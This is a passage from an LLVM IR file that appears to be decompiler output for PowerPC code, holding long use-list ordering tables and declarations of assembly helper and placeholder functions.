274, 432, 433, 434, 1445, 435, 1444, 437, 438, 436, 1446, 1447, 301, 1448, 1449, 99, 49, 302, 1450, 214, 1452, 439, 440, 441, 275, 1453, 1454, 276, 442, 1459, 1460, 443, 1461, 1462, 1463, 444, 100, 279, 277, 278, 445, 446, 1464, 101, 50, 222, 215, 282, 283, 1465, 1466, 1467, 1468, 216, 280, 281, 284, 1469, 1470, 1471, 218, 51, 102, 103, 217, 1472, 1473, 1474, 303, 104, 52, 1475, 1477, 1478, 285, 447, 448, 449, 1479, 1489, 286, 304, 451, 1491, 288, 287, 450, 80, 452, 1492, 1493, 105, 84, 1495, 219, 176, 1496, 289, 290, 291, 292, 1713, 1788, 1789, 1790, 1100, 1101, 1102, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1791, 1792, 1793, 1794, 1795, 1796, 1797, 1798, 1799, 1800, 1801, 1802, 1803, 1804, 1805, 1806, 1807, 1808, 1809, 1810, 1811, 1812, 1813, 1814 }
  uselistorder i32* @lr, { 5, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 223, 517, 518, 519, 388, 392, 389, 390, 391, 396, 397, 393, 394, 395, 398, 399, 400, 401, 402, 6, 7, 8, 9, 10, 11, 403, 407, 404, 1, 406, 0, 408, 410, 411, 409, 412, 413, 414, 415, 416, 417, 418, 419, 131, 420, 421, 422, 423, 424, 425, 224, 225, 426, 427, 428, 429, 430, 431, 432, 433, 226, 227, 228, 229, 434, 435, 436, 437, 438, 524, 525, 526, 527, 520, 521, 522, 523, 439, 440, 444, 441, 442, 443, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 461, 462, 464, 465, 466, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 481, 482, 483, 132, 133, 134, 230, 231, 232, 528, 233, 234, 282, 285, 235, 236, 283, 284, 237, 238, 239, 240, 241, 242, 243, 244, 529, 530, 286, 245, 246, 484, 485, 539, 540, 544, 545, 546, 547, 548, 561, 563, 565, 541, 543, 159, 160, 161, 162, 163, 164, 165, 531, 537, 538, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 182, 12, 13, 190, 15, 191, 14, 16, 486, 488, 487, 489, 490, 491, 478, 479, 480, 181, 324, 492, 493, 135, 463, 460, 215, 60, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 508, 509, 510, 511, 467, 360, 287, 288, 549, 550, 551, 552, 553, 556, 557, 558, 371, 247, 248, 249, 302, 303, 304, 305, 250, 506, 507, 405, 564, 562, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 17, 18, 268, 532, 533, 534, 535, 536, 559, 560, 145, 146, 147, 316, 333, 542, 334, 554, 555, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 136, 137, 138, 139, 140, 141, 142, 143, 144, 153, 148, 149, 150, 151, 152, 2, 154, 155, 156, 157, 158, 183, 184, 185, 186, 187, 188, 189, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 362, 363, 364, 212, 213, 214, 216, 217, 218, 219, 220, 221, 222, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 317, 318, 319, 320, 321, 322, 323, 325, 326, 327, 328, 329, 330, 331, 332, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 361, 365, 366, 367, 368, 369, 370, 372, 512, 513, 514, 515, 516, 3, 4 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #0

declare i32 @__asm_mfcr() local_unnamed_addr

declare %1 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare i4 @__asm_mcrf_cr0_read(i1, i1, i1, i1) local_unnamed_addr

declare %0 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

attributes #0 = { nounwind readnone }
